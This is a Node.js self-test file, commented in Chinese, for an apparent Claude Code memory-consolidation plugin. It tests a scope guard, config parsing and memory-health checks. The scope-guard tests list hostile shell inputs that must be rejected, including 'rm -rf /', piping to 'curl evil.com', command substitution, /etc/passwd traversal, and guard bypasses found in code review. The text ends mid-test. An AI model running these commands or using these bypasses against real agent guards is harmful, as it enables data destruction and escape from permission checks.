#!/usr/bin/env node
// DoD·D1：一键重跑验证。开发方自建沙箱自证跑通，不碰本仓库真实 .claude/。
// 跑法：node test/self-test.mjs
//
// 覆盖：
//  - 全链路：SessionEnd hook -> 落标记 -> 分离进程 -> 底片压缩 -> 冷却判定 -> 梦 -> 报告 -> commit 拆分 -> revert -> 下次会话提示
//  - AC3 冷却期内不重复触发
//  - AC4 防递归（CLAUDE_INVOKED_BY 设置时 hook 直接 no-op）
//  - 故障注入（rogue）：越界写入确实被拒、不落盘
//  - PBI-01.1：底片一场一文件 + 幂等（重复触发不产第二页）+ 规则表纯函数单测（含未知类型留痕）+ AC2 零 API 静态检查
//  - PBI-01.1·AC4：超大稿压力测试（合成 20MB 逐字稿，验流式处理不崩 + 压缩比不失控）
//  - PBI-01.1·AC5：底片写失败故障注入（D4 点烟）
//  - PBI-01.1·AC6：漏网场补捞（排除梦会话/活稿判别/可重入/清理跳过，D4 点烟）
//  - PBI-01.2·AC3：埋标记话，验证底片里按原文检索得到
//  - PBI-02.1：阀门配置——六键解析/默认值/非法回退/文件>环境变量/enabled:false 不拉梦但底片照常

import { execFileSync, spawnSync } from 'node:child_process';
import { mkdtempSync, writeFileSync, appendFileSync, readFileSync, readdirSync, existsSync, mkdirSync, rmSync, utimesSync, createWriteStream, statSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { dreamPaths, RECURSION_GUARD_ENV, RECURSION_GUARD_VALUE } from '../src/lib/paths.mjs';
import { judgePath, judgeShell } from '../src/lib/scope-guard.mjs';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const PLUGIN_ROOT = path.join(__dirname, '..');
const SRC = path.join(PLUGIN_ROOT, 'src');

const results = [];
function check(name, cond, detail = '') {
  results.push({ name, pass: !!cond, detail });
  console.log(`${cond ? 'PASS' : 'FAIL'} - ${name}${detail ? ' :: ' + detail : ''}`);
}

function git(cwd, args) {
  return execFileSync('git', args, { cwd, encoding: 'utf8', windowsHide: true }).trim();
}

// Sprint-2：每个沙箱配一份假逐字稿，模拟 SessionEnd payload 的 transcript_path 指向的东西。
// 埋一条带唯一 marker 的用户消息，供 PBI-01.2·AC3「按原文检索到」类断言直接 grep 底片文件。
function fakeTranscriptLines(sessionId, marker) {
  const ts = new Date().toISOString();
  return [
    { type: 'user', sessionId, uuid: 'fake-u1', timestamp: ts, isSidechain: false, userType: 'external', cwd: '', version: 'test', parentUuid: null, message: { role: 'user', content: [{ type: 'text', text: `${marker} —— 用户说的这句话不该蒸发` }] } },
    { type: 'assistant', sessionId, uuid: 'fake-a1', timestamp: ts, isSidechain: false, userType: 'external', cwd: '', version: 'test', parentUuid: 'fake-u1', message: { model: 'test', id: 'msg-1', type: 'message', role: 'assistant', content: [{ type: 'text', text: '收到，已记录。' }] } },
  ].map((e) => JSON.stringify(e)).join('\n') + '\n';
}

function sandboxSessionId(label) {
  return `${label}-session-id`;
}
function sandboxMarker(label) {
  return `SELF-TEST-MARKER-${label}-${process.pid}`;
}
function sandboxTranscriptPath(dir) {
  return path.join(dir, 'fake-transcript.jsonl');
}

function makeSandbox(label) {
  const dir = mkdtempSync(path.join(os.tmpdir(), `claude-dream-self-test-${label}-`));
  git(dir, ['init', '-q']);
  git(dir, ['config', 'user.email', 'test@example.com']);
  git(dir, ['config', 'user.name', 'claude-dream self-test']);
  mkdirSync(path.join(dir, '.claude', 'memory'), { recursive: true });
  writeFileSync(
    path.join(dir, '.claude', 'memory', 'existing-fact.md'),
    '---\nname: existing-fact\ndescription: 沙箱预置的一条既有记忆\nmetadata:\n  type: project\n---\n\n沙箱预置内容，供测试对照，不应被占位引擎动到。\n',
    'utf8'
  );
  writeFileSync(
    path.join(dir, '.claude', 'memory', 'MEMORY.md'),
    '# Memory Index\n\n- [既有事实](existing-fact.md) — 沙箱预置\n',
    'utf8'
  );
  writeFileSync(path.join(dir, 'CLAUDE.md'), '# Sandbox Project\n\n自测沙箱，不是真实项目。\n', 'utf8');
  git(dir, ['add', '-A']);
  git(dir, ['commit', '-q', '-m', 'initial sandbox state']);

  const sessionId = sandboxSessionId(label);
  writeFileSync(sandboxTranscriptPath(dir), fakeTranscriptLines(sessionId, sandboxMarker(label)), 'utf8');

  return dir;
}

// Sprint-2 起 session-end.mjs 硬性要求 stdin 携带 session_id/transcript_path/cwd——
// 每处调用都要带这三样，不能只传 cwd 了（老约定已废止，见 session-end.mjs 顶部注释）。
function sessionEndPayload(sandbox, label) {
  return { cwd: sandbox, session_id: sandboxSessionId(label), transcript_path: sandboxTranscriptPath(sandbox) };
}

function runNode(scriptPath, args, { cwd, stdinJson, env } = {}) {
  return spawnSync(process.execPath, [scriptPath, ...(args ?? [])], {
    cwd: cwd ?? PLUGIN_ROOT,
    input: stdinJson !== undefined ? JSON.stringify(stdinJson) : '',
    encoding: 'utf8',
    env: { ...process.env, ...(env ?? {}) },
    windowsHide: true,
  });
}

async function waitFor(predicate, { timeoutMs = 120000, intervalMs = 1000 } = {}) {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    if (await predicate()) return true;
    await new Promise((r) => setTimeout(r, intervalMs));
  }
  return false;
}

function testScopeGuardUnit() {
  console.log('\n=== scope-guard 纯函数单测（无需沙箱/SDK） ===');
  const root = process.platform === 'win32' ? 'C:\\fake-root' : '/fake-root';
  const outsideAbs = process.platform === 'win32' ? 'C:\\somewhere-else\\outside.md' : '/somewhere-else/outside.md';
  const j = (p) => path.join(root, p);

  check('允许：写 .claude/memory/ 下的文件', judgePath(j('.claude/memory/x.md'), root).allow);
  check('允许：写 .claude/dream/ 下的文件', judgePath(j('.claude/dream/x.log'), root).allow);
  check('允许：写 CLAUDE.md（阀门默认开）', judgePath(j('CLAUDE.md'), root).allow);
  check('拒绝：相对路径逃逸 ../../outside.md', !judgePath('../../outside.md', root).allow);
  check('拒绝：绝对路径直接指到项目外的另一棵树', !judgePath(outsideAbs, root).allow);
  check('拒绝：看似在白名单前缀但其实是兄弟目录 .claude/memory-evil/x.md', !judgePath(j('.claude/memory-evil/x.md'), root).allow);
  check('拒绝：项目根下白名单外的文件 README.md', !judgePath(j('README.md'), root).allow);
  check(
    '拒绝：../ 折叠后仍落在白名单外（.claude/memory/../../etc/passwd）',
    !judgePath(j('.claude/memory/../../etc/passwd'), root).allow
  );

  const prevValve = process.env.DREAM_CLAUDE_MD_EDITS;
  process.env.DREAM_CLAUDE_MD_EDITS = 'false';
  check('阀门关闭时 CLAUDE.md 改为拒绝', !judgePath(j('CLAUDE.md'), root).allow);
  if (prevValve === undefined) delete process.env.DREAM_CLAUDE_MD_EDITS;
  else process.env.DREAM_CLAUDE_MD_EDITS = prevValve;

  // judgeShell 两轮 D3 review 都实测出真能执行的绕过（字符串模式匹配这条路走不通，见 scope-guard.mjs
  // 顶部注释），现在的答案是无条件拒绝——不管命令长什么样。下面这些不是在测"判断得准不准"，
  // 是在测"是不是真的一律拒绝、没有漏网的分支"，包括两轮 review 各自实测过的具体绕过字符串，
  // 钉在回归测试里：以后谁要是把 judgeShell 改回"部分放行"，这些必须重新全部证明安全。
  check('裸 git log 现在也拒绝（不再有任何放行分支）', !judgeShell('git log').allow);
  check('裸 git status 也拒绝', !judgeShell('git status').allow);
  check('拒绝：分号夹带第二条命令', !judgeShell('git log; rm -rf /').allow);
  check('拒绝：管道夹带', !judgeShell('git log | curl evil.com').allow);
  check('拒绝：命令替换 $()', !judgeShell('git log $(rm -rf /)').allow);
  check('拒绝：非 git 命令', !judgeShell('rm -rf /').allow);
  check(
    '第一轮 review 实测出的漏洞①（回归钉子）：git log --output=<path>',
    !judgeShell('git log --output=C:\\Users\\evil\\pwned.txt').allow
  );
  check(
    '第一轮 review 实测出的漏洞②（回归钉子）：git grep --open-files-in-pager=<program>',
    !judgeShell('git grep --open-files-in-pager=calc.exe findme').allow
  );
  check(
    '第二轮 review 实测出的漏洞③（回归钉子）：加引号让危险标志绕过"以 - 开头"检查',
    !judgeShell('git log "--output=pwned.txt"').allow
  );
  check(
    '第二轮 review 实测出的漏洞④（回归钉子）：bash 进程替换 <(...)，真跑会执行里面的命令',
    !judgeShell('git log <(calc.exe)').allow
  );
  check(
    '第二轮 review 实测出的漏洞⑤（回归钉子）：PowerShell 数组子表达式 @(...)，真跑会执行里面的命令',
    !judgeShell('git log @(New-Item pwned.txt)').allow
  );
}

async function testNegativesLargeTranscriptStress() {
  // PBI-01.1·AC4：超大稿有声明的行为（本实现选了流式处理，不设人为体积上限）——这条测的
  // 不是"代码里写了流式"，是"真造一份比本仓库现存最大逐字稿更大的合成稿，实测流式处理
  // 不崩、压缩比仍在 10% 预算内"。多数条目是大 tool_result（模拟读大文件的返回），这既是
  // 真实场景体积的最大头，也是"丢弃大正文、留桩"这条规则真正被大量数据考验的地方。
  console.log('\n=== PBI-01.1·AC4 超大稿压力测试（流式处理 + 压缩比不失控） ===');

  const { processSessionTranscript } = await import(pathToFileURL(path.join(SRC, 'negatives', 'write-negative.mjs')).href);

  const root = mkdtempSync(path.join(os.tmpdir(), 'claude-dream-self-test-largefile-'));
  const transcriptPath = path.join(root, 'large-transcript.jsonl');
  const sessionId = 'large-session-1';

  const targetBytes = 20 * 1024 * 1024; // 20MB，本仓库实测现存最大约 10MB 的两倍
  const bigBody = 'x'.repeat(50000); // 模拟一次读大文件的工具返回，50KB/条
  await new Promise((resolve, reject) => {
    const ws = createWriteStream(transcriptPath, { encoding: 'utf8' });
    let written = 0;
    let i = 0;
    ws.on('error', reject);
    ws.on('finish', resolve);
    while (written < targetBytes) {
      const lines =
        JSON.stringify({ type: 'user', message: { role: 'user', content: [{ type: 'text', text: `第 ${i} 轮：请读一下这个文件` }] } }) + '\n' +
        JSON.stringify({ type: 'assistant', message: { content: [{ type: 'tool_use', id: `t${i}`, name: 'Read', input: { file_path: `/fake/file-${i}.txt` } }] } }) + '\n' +
        JSON.stringify({ type: 'user', message: { content: [{ tool_use_id: `t${i}`, type: 'tool_result', content: bigBody, is_error: false }] } }) + '\n';
      ws.write(lines);
      written += lines.length;
      i++;
    }
    ws.end();
  });

  const actualBytes = statSync(transcriptPath).size;
  console.log(`合成逐字稿实际体积：${(actualBytes / 1024 / 1024).toFixed(1)} MB`);

  const start = Date.now();
  const result = await processSessionTranscript({ root, sessionId, transcriptPath });
  const elapsedMs = Date.now() - start;

  check('AC4 大稿处理成功（流式读取未崩溃）', result.status === 'written', JSON.stringify({ status: result.status, reason: result.reason }));
  if (result.status === 'written') {
    check('AC4 压缩比在 10% 预算内（锚：现成件实测约 1.8%，本实现留有余量）', result.ratio <= 0.1, `实际 ratio=${(result.ratio * 100).toFixed(2)}%`);
    // D3 review 抓到的坑（回归钉子）：ratio 和 compressedBytes 曾经用两个不同的字节数算出来，
    // 数学上对不上——这条直接断言两者自洽，不是从旁边猜它们应该一致。
    check(
      'D3 回归：outcome.ratio 与 outcome.compressedBytes/originalBytes 数学自洽',
      Math.abs(result.ratio - result.compressedBytes / result.originalBytes) < 1e-9,
      `ratio=${result.ratio} compressedBytes/originalBytes=${result.compressedBytes / result.originalBytes}`
    );
    console.log(`处理耗时 ${elapsedMs}ms，压缩后 ${(result.compressedBytes / 1024).toFixed(1)} KB`);
  }

  rmSync(root, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 });
}

async function testNotebookEditFieldName() {
  // 直接跑真实的 createCanUseTool（不是重新实现一遍字段选择逻辑）——D3 review 抓到的坑：
  // SDK 的 NotebookEdit 输入字段叫 notebook_path，曾经的代码读的是 file_path（恒为 undefined，恒被拒）。
  const tmpLog = path.join(os.tmpdir(), `claude-dream-notebook-test-${Date.now()}.log`);
  const root = process.platform === 'win32' ? 'C:\\fake-root' : '/fake-root';
  const { createCanUseTool } = await import('../src/lib/scope-guard.mjs');
  const canUseTool = createCanUseTool({ root, logFile: tmpLog });
  const result = await canUseTool('NotebookEdit', { notebook_path: path.join(root, '.claude', 'memory', 'x.ipynb') });
  check('NotebookEdit 走真实 createCanUseTool，按 notebook_path 正确放行白名单内目标', result.behavior === 'allow');
  rmSync(tmpLog, { force: true });
}

async function testValveConfig() {
  // PBI-02.1：阀门配置。上半场是 resolveConfig 纯解析单测（不起会话），下半场是
  // enabled: false 的真实全链路闸门（起 session-end -> 分离进程，亲眼看到底片照常落、
  // 梦不拉）。
  console.log('\n=== PBI-02.1 阀门配置（解析顺序/回退/enabled 闸门） ===');
  const { resolveConfig, CONFIG_FILE_NAME } = await import('../src/engine/config.mjs');

  const tmpDir = mkdtempSync(path.join(os.tmpdir(), 'claude-dream-self-test-config-'));
  const cfgPath = path.join(tmpDir, '.claude', CONFIG_FILE_NAME);
  const writeCfg = (content) => {
    mkdirSync(path.dirname(cfgPath), { recursive: true });
    writeFileSync(cfgPath, content, 'utf8');
  };

  // 环境变量卫生：测试期间清掉四个新变量 + 两个既有变量，跑完原样恢复——不污染后续测试组。
  const envKeys = [
    'CLAUDE_DREAM_ENABLED', 'CLAUDE_DREAM_LLM_CHECKS', 'CLAUDE_DREAM_DELETE_POLICY',
    'CLAUDE_DREAM_MAX_DELETES', 'DREAM_CLAUDE_MD_EDITS', 'CLAUDE_DREAM_COOLDOWN_MINUTES',
  ];
  const savedEnv = Object.fromEntries(envKeys.map((k) => [k, process.env[k]]));
  const clearEnv = () => envKeys.forEach((k) => delete process.env[k]);
  const restoreEnv = () => envKeys.forEach((k) => {
    if (savedEnv[k] === undefined) delete process.env[k];
    else process.env[k] = savedEnv[k];
  });

  try {
    clearEnv();

    // 1) 无配置文件：六键全默认，provenance 全 default
    const noFile = resolveConfig(tmpDir);
    check(
      '无配置文件：六键全默认（true/on/quarantine-first/3/true/30）',
      noFile.values.enabled === true && noFile.values.llm_checks === 'on' &&
      noFile.values.delete_policy === 'quarantine-first' && noFile.values.max_deletes === 3 &&
      noFile.values.claude_md_edits === true && noFile.values.cooldown_minutes === 30,
      JSON.stringify(noFile.values)
    );
    check('无配置文件：provenance 全 default', Object.values(noFile.provenance).every((p) => p === 'default'));
    check('无配置文件：envOverriddenKeys 为空（无覆盖可标注）', noFile.envOverriddenKeys.length === 0);

    // 2) 全六键文件：值全部生效
    writeCfg('---\nenabled: false\nllm_checks: off\ndelete_policy: report-only\nmax_deletes: 7\nclaude_md_edits: false\ncooldown_minutes: 0\n---\n正文随意\n');
    const full = resolveConfig(tmpDir);
    check(
      '全六键文件：值全部生效',
      full.values.enabled === false && full.values.llm_checks === 'off' &&
      full.values.delete_policy === 'report-only' && full.values.max_deletes === 7 &&
      full.values.claude_md_edits === false && full.values.cooldown_minutes === 0,
      JSON.stringify(full.values)
    );
    check('全六键文件：provenance 全 file', Object.values(full.provenance).every((p) => p === 'file'));
    check('配置文件存在标志为真', full.configFileExists === true);

    // 3) 部分键：缺键回默认，provenance 混合
    writeCfg('---\nmax_deletes: 5\n---\n');
    const partial = resolveConfig(tmpDir);
    check(
      '部分键：max_deletes=5 来自文件，缺键回默认',
      partial.values.max_deletes === 5 && partial.values.enabled === true && partial.values.delete_policy === 'quarantine-first',
      JSON.stringify(partial.values)
    );
    check(
      '部分键：provenance 混合 file/default',
      partial.provenance.max_deletes === 'file' && partial.provenance.enabled === 'default',
      JSON.stringify(partial.provenance)
    );

    // 4) AC4：配置文件优先于环境变量——文件有键时环境变量不生效、不进覆盖名单
    process.env.CLAUDE_DREAM_MAX_DELETES = '9';
    const fileWins = resolveConfig(tmpDir);
    check('AC4 配置文件优先：文件有键时环境变量不生效', fileWins.values.max_deletes === 5, `实际 ${fileWins.values.max_deletes}`);
    check('AC4 配置文件优先：该键不进 envOverriddenKeys', !fileWins.envOverriddenKeys.includes('max_deletes'), JSON.stringify(fileWins.envOverriddenKeys));

    // 5) AC4：文件缺键 + 环境变量 → 环境变量生效，且必须进 envOverriddenKeys 供报告标注
    writeCfg('---\nenabled: true\n---\n');
    const envFills = resolveConfig(tmpDir);
    check('文件缺键时环境变量生效（测试/临时注入通道）', envFills.values.max_deletes === 9, `实际 ${envFills.values.max_deletes}`);
    check('覆盖生效进 envOverriddenKeys（报告阀门状态节据此标注）', envFills.envOverriddenKeys.includes('max_deletes'));
    check('该键 provenance 为 env', envFills.provenance.max_deletes === 'env');
    delete process.env.CLAUDE_DREAM_MAX_DELETES;

    // 6) 非法值：回退默认 + 记入 notes（透明，报告可展示），不是静默吞掉也不是报错炸链
    writeCfg('---\nmax_deletes: abc\ndelete_policy: nuke-everything\nenabled: maybe\n---\n');
    const invalid = resolveConfig(tmpDir);
    check(
      '非法值回退默认（max_deletes/delete_policy/enabled 三键）',
      invalid.values.max_deletes === 3 && invalid.values.delete_policy === 'quarantine-first' && invalid.values.enabled === true,
      JSON.stringify(invalid.values)
    );
    check('非法值记入 notes', invalid.notes.length >= 3, JSON.stringify(invalid.notes));
    check(
      'F1 回归：文件侧非法值的 provenance 如实记 default（生效来源是默认值，不冒充文件配置）',
      invalid.provenance.max_deletes === 'default' && invalid.provenance.delete_policy === 'default' && invalid.provenance.enabled === 'default',
      JSON.stringify(invalid.provenance)
    );

    // 6b) F1 回归钉子（D3 review 抓到的坑）：环境变量值非法 → 回退默认，且不得谎报「覆盖生效」。
    // 环境变量分支只在文件缺键时才会走到——上一组 writeCfg 里有 max_deletes: abc（非法），
    // 文件有键就直接按文件结算，永远轮不到 env。先换成不含 max_deletes 的配置再设非法 env。
    writeCfg('---\nenabled: true\n---\n');
    process.env.CLAUDE_DREAM_MAX_DELETES = 'banana';
    const badEnv = resolveConfig(tmpDir);
    check('F1 回归：非法环境变量回退默认', badEnv.values.max_deletes === 3, `实际 ${badEnv.values.max_deletes}`);
    check('F1 回归：非法环境变量不进 envOverriddenKeys（不谎报覆盖生效）', !badEnv.envOverriddenKeys.includes('max_deletes'), JSON.stringify(badEnv.envOverriddenKeys));
    check('F1 回归：非法环境变量的 provenance 如实记 default', badEnv.provenance.max_deletes === 'default');
    check('F1 回归：非法环境变量记入 notes（透明可查）', badEnv.notes.some((n) => n.includes('CLAUDE_DREAM_MAX_DELETES')), JSON.stringify(badEnv.notes));
    delete process.env.CLAUDE_DREAM_MAX_DELETES;

    // 7) frontmatter 不完整：只有开头没有收尾 / 根本没有 frontmatter——整体视为无效配置源，回默认
    writeCfg('---\nenabled: false\n');
    check('frontmatter 只有开头无收尾：回默认（enabled 不生效）', resolveConfig(tmpDir).values.enabled === true);
    writeCfg('正文没有 frontmatter\nenabled: false\n');
    check('无 frontmatter 的文件：回默认（enabled 不生效）', resolveConfig(tmpDir).values.enabled === true);

    // 8) 引号与行尾注释容忍（YAML 常见写法）
    writeCfg('---\nllm_checks: "off" # 手工关掉 LLM 层\n---\n');
    check('带引号与行尾注释的值解析正确', resolveConfig(tmpDir).values.llm_checks === 'off');
  } finally {
    restoreEnv();
    rmSync(tmpDir, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 });
  }

  // 9) AC2 全链路闸门：enabled: false 时底片照常落、梦不拉。
  // 这是 D4 覆盖的守卫分支——不是读代码猜"应该会 return"，是真起一场 session-end 亲眼看。
  const sandbox = makeSandbox('config-disabled');
  const paths = dreamPaths(sandbox);
  mkdirSync(path.join(sandbox, '.claude'), { recursive: true });
  writeFileSync(path.join(sandbox, '.claude', CONFIG_FILE_NAME), '---\nenabled: false\n---\n', 'utf8');
  console.log(`enabled:false 闸门沙箱: ${sandbox}`);

  runNode(path.join(SRC, 'session-end.mjs'), [], { cwd: sandbox, stdinJson: sessionEndPayload(sandbox, 'config-disabled') });

  const negativesWritten = await waitFor(() => {
    if (!existsSync(paths.negativeLedger)) return false;
    try {
      const ledger = JSON.parse(readFileSync(paths.negativeLedger, 'utf8'));
      return (ledger[sandboxSessionId('config-disabled')]?.pages?.length ?? 0) > 0;
    } catch {
      return false;
    }
  });
  check('AC2 enabled:false：底片照常落（台账有本场会话记录）', negativesWritten);

  // 底片落盘证明分离进程已走完压缩步；enabled 闸门紧随其后。再给一小段宽限让进程走到闸门并退出。
  await new Promise((r) => setTimeout(r, 3000));
  check('AC2 enabled:false：不拉梦（last-dream.json 未产生）', !existsSync(paths.lastDreamState));
  check('AC2 enabled:false：没有 dream: 提交', !git(sandbox, ['log', '--oneline']).includes('dream:'));
  check('AC2 enabled:false：没有 dream.lock 残留（闸门在拿锁之前）', !existsSync(paths.lockFile));

  return sandbox;
}

function plantMemory(dir, slug, { type = 'project', body = '', sources = null, name = null } = {}) {
  const srcLines = sources
    ? sources.length === 1
      ? [`sources: ${sources[0]}`]
      : ['sources:', ...sources.map((s) => `  - ${s}`)]
    : [];
  const fm = [
    '---',
    `name: ${name ?? slug}`,
    `description: ${slug} 种植记忆`,
    'metadata:',
    `  type: ${type}`,
    ...srcLines,
    '---',
    '',
    body,
    '',
  ].join('\n');
  writeFileSync(path.join(dir, `${slug}.md`), fm, 'utf8');
}

function plantIndex(memoryDir, entries) {
  // entries: [{slug, label}] 或带 extraSlug 的幽灵行由调用方追加
  const lines = ['# Memory Index', '', ...entries.map((e) => `- [${e.label}](${e.slug}.md) — ${e.slug}`), ''];
  writeFileSync(path.join(memoryDir, 'MEMORY.md'), lines.join('\n'), 'utf8');
}

async function testMechanicalChecks() {
  // PBI-02.2：M1–M5 判据引擎。种植腐烂沙箱逐类检出 + 健康记忆零误报（AC7 查准兜底）
  // + M2 冷启动禁用 + 实体抽取纯函数单测。零 API：本测试组不碰 SDK，全程受信任代码。
  console.log('\n=== PBI-02.2 M1–M5 机械体检判据引擎（种植腐烂沙箱） ===');
  const { runMechanicalChecks, extractEntities, extractLinks, resolveLink, parseMemoryFile } = await import('../src/engine/check.mjs');
  const { createEngineLog } = await import('../src/lib/exec-log.mjs');

  // ---- 0) 实体抽取纯函数单测（不起沙箱） ----
  const urlBody = '参考 https://example.com/docs.md 与 https://example.org/deep/link.js ——不应抽实体；`npm` 单蹦词也不抽；'
    + '`node claude-dream/test/self-test.mjs` 路径形抽；`SPECIAL COMMAND SENTENCE` 命令形抽；裸路径 src/lib/thing.mjs 抽。';
  const ents = extractEntities(urlBody);
  check('M4 抽取：URL（即使以 .md/.js 结尾）不抽为实体', !ents.some((e) => e.includes('example.com') || e.includes('example.org')), JSON.stringify(ents));
  check('M4 抽取：反引号纯词不抽（`npm`）', !ents.includes('npm'), JSON.stringify(ents));
  check('M4 抽取：路径形反引号 token 抽', ents.includes('node claude-dream/test/self-test.mjs'));
  check('M4 抽取：命令形（含空格）反引号 token 抽', ents.includes('SPECIAL COMMAND SENTENCE'));
  check('M4 抽取：裸路径形 token（已知扩展名）抽', ents.includes('src/lib/thing.mjs'));

  const memUnit = parseMemoryFile;
  // 用沙箱内一个真文件顺带验 parseMemoryFile 的 sources 块解析（下面主沙箱会建）
  const unitDir = mkdtempSync(path.join(os.tmpdir(), 'claude-dream-self-test-checkunit-'));
  try {
    plantMemory(unitDir, 'unit-mem', { sources: ['a.jsonl', 'b.jsonl'] });
    const parsed = memUnit(path.join(unitDir, 'unit-mem.md'));
    check('parseMemoryFile：sources 块列表解析为两条', parsed.sources.length === 2 && parsed.sources[0] === 'a.jsonl' && parsed.sources[1] === 'b.jsonl', JSON.stringify(parsed.sources));
    check('parseMemoryFile：type 从 metadata.type 读出', parsed.type === 'project');
    const links = extractLinks('前文 [[foo]] 中段 [[bar.md]] 与 [[foo]] 重复。');
    check('extractLinks：去重保序', links.length === 2 && links[0] === 'foo' && links[1] === 'bar.md', JSON.stringify(links));
  } finally {
    rmSync(unitDir, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 });
  }

  // ---- 1) 主沙箱：种植腐烂 + 健康对照 ----
  const root = mkdtempSync(path.join(os.tmpdir(), 'claude-dream-self-test-checks-'));
  git(root, ['init', '-q']);
  git(root, ['config', 'user.email', 'test@example.com']);
  git(root, ['config', 'user.name', 'claude-dream self-test']);
  mkdirSync(path.join(root, 'src', 'lib'), { recursive: true });
  mkdirSync(path.join(root, 'scripts'), { recursive: true });
  mkdirSync(path.join(root, 'data'), { recursive: true });
  // 注意 M4 的检索语义：git grep 搜的是「实体字符串在跟踪文件内容里的出现」，不是路径存在性。
  // 健康记忆引用的 src/lib/thing.mjs 要在文件内容里真的出现（如 import 语句/文件头自述），
  // 否则照样 0 命中误判候选。
  writeFileSync(path.join(root, 'src', 'lib', 'thing.mjs'), '// src/lib/thing.mjs — THING-EXISTS-MARKER\nimport { x } from "./other.mjs";\nexport const x = 1;\n', 'utf8');
  writeFileSync(path.join(root, 'scripts', 'run.mjs'), '// RUN-ALL-MARKER-TOKEN\nconsole.log("SPECIAL COMMAND SENTENCE");\n', 'utf8');
  writeFileSync(path.join(root, 'data', 'real-source.jsonl'), '{"type":"user"}\n', 'utf8');
  writeFileSync(path.join(root, 'doomed.txt'), 'doomed content\n', 'utf8');
  writeFileSync(path.join(root, 'CLAUDE.md'), '# Check Sandbox\n', 'utf8');
  git(root, ['add', '-A']);
  git(root, ['commit', '-q', '-m', 'plant project files']);
  // doomed.txt 讣告：删除并提交——M4 确凿级的证据来源
  rmSync(path.join(root, 'doomed.txt'));
  git(root, ['add', '-A']);
  git(root, ['commit', '-q', '-m', 'remove doomed.txt']);

  const memoryDir = path.join(root, '.claude', 'memory');
  mkdirSync(memoryDir, { recursive: true });

  // 健康记忆：链接互指 + 引用存在的项目实体——逐条查准，任何判据都不该碰它们
  plantMemory(memoryDir, 'healthy-a', { body: '健康记忆 A。使用 [[healthy-b]] 的结论，实现见 src/lib/thing.mjs。' });
  plantMemory(memoryDir, 'healthy-b', { body: '健康记忆 B，被 [[healthy-a]] 引用。' });
  plantMemory(memoryDir, 'healthy-d', { sources: ['data/real-source.jsonl'], body: '溯源健康，sources 指向真实存在的文件。链接 [[healthy-a]]。' });
  plantMemory(memoryDir, 'url-noise', { body: '参考 https://example.com/docs.md 的写法；`npm` 装依赖。链接 [[healthy-a]]。' });
  plantMemory(memoryDir, 'generic-word', { body: '跑 `SPECIAL COMMAND SENTENCE` 即可，`npm` 单蹦。链接 [[healthy-a]]。' });

  // 腐烂种植：每类判据至少一条。除 orphan-island 外的腐烂文件都带 [[healthy-a]] 出链——
  // 它们是"有链接的腐烂"，不是孤儿；孤儿是单独一类，只允许 orphan-island 一条。
  plantMemory(memoryDir, 'broken-link', { body: '断链记忆：[[ghost-slug]] 与 [[missing/path.md]] 都不存在。' });
  plantMemory(memoryDir, 'orphan-island', { body: '一条孤立记忆，没有任何链接，也没有任何人链接它。' });
  plantMemory(memoryDir, 'dangling-source', { sources: ['missing/log.jsonl'], body: '溯源悬空，来源日志已消失。链接 [[healthy-a]]。' });
  plantMemory(memoryDir, 'stale-entity-candidate', { body: '该功能见 never-existed-file.txt。链接 [[healthy-a]]。' });
  plantMemory(memoryDir, 'dead-entity-confirmed', { body: '参见 doomed.txt。链接 [[healthy-a]]。' });
  plantMemory(memoryDir, 'unindexed-memory', { body: '漏索引的记忆，链接 [[healthy-a]]。' });

  // 填充记忆：带出链，凑满 M2 冷启动门槛（15）
  const fillerSlugs = [];
  for (let i = 1; i <= 10; i++) {
    const slug = `filler-${String(i).padStart(2, '0')}`;
    fillerSlugs.push(slug);
    plantMemory(memoryDir, slug, { body: '填充记忆，链接 [[healthy-a]]。' });
  }

  const indexedSlugs = ['healthy-a', 'healthy-b', 'healthy-d', 'url-noise', 'generic-word',
    'broken-link', 'orphan-island', 'dangling-source', 'stale-entity-candidate', 'dead-entity-confirmed',
    ...fillerSlugs];
  plantIndex(memoryDir, indexedSlugs.map((s) => ({ slug: s, label: s })));
  // M5 幽灵行：索引里有、盘上无
  const indexWithGhost = readFileSync(path.join(memoryDir, 'MEMORY.md'), 'utf8') + '- [幽灵条目](ghost-index.md) — 盘上不存在\n';
  writeFileSync(path.join(memoryDir, 'MEMORY.md'), indexWithGhost, 'utf8');

  const paths = dreamPaths(root);
  const logFile = path.join(paths.dreamDir, 'checks-engine.log');
  const exec = createEngineLog({ logFile });
  const { findings, meta, mems } = runMechanicalChecks({ root, paths, exec });

  check('主沙箱记忆库存 ≥15（M2 不被冷启动禁用）', meta.memoryCount >= 15, `count=${meta.memoryCount}`);
  check('M2 未被禁用', meta.m2Disabled === false, meta.m2DisabledReason);

  const byId = (id) => findings.filter((f) => f.id === id);
  const onObject = (id, obj) => findings.filter((f) => f.id === id && f.object === obj);

  // M1：两条断链各自检出，附出处（对象+行号+链接原文）
  const m1s = byId('M1');
  check('M1 检出数恰为 2（ghost-slug + missing/path.md）', m1s.length === 2, JSON.stringify(m1s.map((f) => f.detail)));
  check('M1 出处指向 broken-link 文件', m1s.every((f) => f.object === 'broken-link'));
  check('M1 两笔链接各检出（ghost-slug 与 missing/path.md）', m1s.some((f) => f.detail.link === 'ghost-slug') && m1s.some((f) => f.detail.link === 'missing/path.md'));
  check('M1 出处细化到行号', m1s.every((f) => typeof f.detail.line === 'number' && f.detail.line >= 1), JSON.stringify(m1s.map((f) => f.detail.line)));
  check('M1 健康链接零误报（healthy-a↔healthy-b、fillers→healthy-a 均解析成功）', !m1s.some((f) => !['broken-link'].includes(f.object)));

  // M2：恰一条孤儿
  const m2s = byId('M2');
  check('M2 检出恰为 1（orphan-island）', m2s.length === 1 && m2s[0].object === 'orphan-island', JSON.stringify(m2s.map((f) => f.object)));
  check('M2 健康记忆零误报（有出链或有入链的都不算孤儿）', !m2s.some((f) => f.object !== 'orphan-island'));

  // M3：恰一条悬空溯源；指向存在文件的 sources 零误报
  const m3s = byId('M3');
  check('M3 检出恰为 1（dangling-source）', m3s.length === 1 && m3s[0].object === 'dangling-source', JSON.stringify(m3s.map((f) => f.detail)));
  check('M3 指向存在文件的溯源零误报（healthy-d）', !m3s.some((f) => f.object === 'healthy-d'));

  // M4：两级证据可区分——候选（无讣告）vs 确凿（讣告在案）；命中场景零误报
  const m4s = byId('M4');
